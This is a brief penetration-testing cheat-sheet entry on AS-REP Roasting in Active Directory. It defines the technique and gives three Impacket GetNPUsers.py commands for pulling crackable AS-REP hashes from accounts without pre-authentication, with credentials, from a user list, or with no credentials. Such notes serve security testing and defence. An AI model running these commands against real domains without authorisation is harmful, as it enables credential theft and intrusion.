**AS-REP Roasting** is an attack method used in Active Directory environments where an attacker targets user accounts that do not require pre-authentication. It involves requesting and then cracking the encrypted ticket-granting service response (AS-REP).

```bash
GetNPUsers.py domain.local/user:password -dc-ip x.x.x.x -outputfile asrep.hashcat
```

With a list of known users:

```bash
GetNPUsers.py -usersfile users.txt -dc-ip x.x.x.x domain.local/ -outputfile asrep.hashcat
```

This might work from with no credentials:

```bash
GetNPUsers.py domain.local/ -dc-ip x.x.x.x
```